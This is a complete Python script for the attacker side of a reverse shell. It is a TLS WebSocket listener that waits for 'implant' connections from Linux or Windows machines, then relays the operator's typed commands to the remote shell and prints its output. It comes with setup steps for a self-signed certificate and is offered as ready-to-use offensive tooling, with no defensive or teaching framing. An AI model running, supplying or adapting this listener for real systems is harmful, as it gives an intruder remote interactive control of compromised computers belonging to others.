#!/usr/bin/env python3
"""
WSS reverse shell listener (attacker side).
Works with both ERS (Linux) and ERS-W (Windows) implants.

Setup:
  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
    -days 365 -nodes -subj '/CN=localhost'
  pip install websockets
  python3 listener.py [port]
"""

import asyncio
import ssl
import sys
import os

try:
    import websockets
except ImportError:
    print("[!] pip install websockets")
    sys.exit(1)

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4443

async def handler(ws):
    print(f"[*] Shell connected from {ws.remote_address}")
    loop = asyncio.get_event_loop()

    async def read_stdin():
        while True:
            line = await loop.run_in_executor(None, sys.stdin.readline)
            if not line:
                break
            await ws.send(line)

    async def write_stdout():
        async for msg in ws:
            if isinstance(msg, bytes):
                os.write(sys.stdout.fileno(), msg)
            else:
                sys.stdout.write(msg)
                sys.stdout.flush()

    try:
        await asyncio.gather(read_stdin(), write_stdout())
    except websockets.ConnectionClosed:
        print("\n[*] Shell disconnected.")

async def main():
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.load_cert_chain("cert.pem", "key.pem")

    print(f"[*] Listening on wss://0.0.0.0:{PORT} (all paths)")
    print(f"[*] Waiting for implant connection...")

    async with websockets.serve(handler, "0.0.0.0", PORT, ssl=ssl_ctx, process_request=lambda p, h: None):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
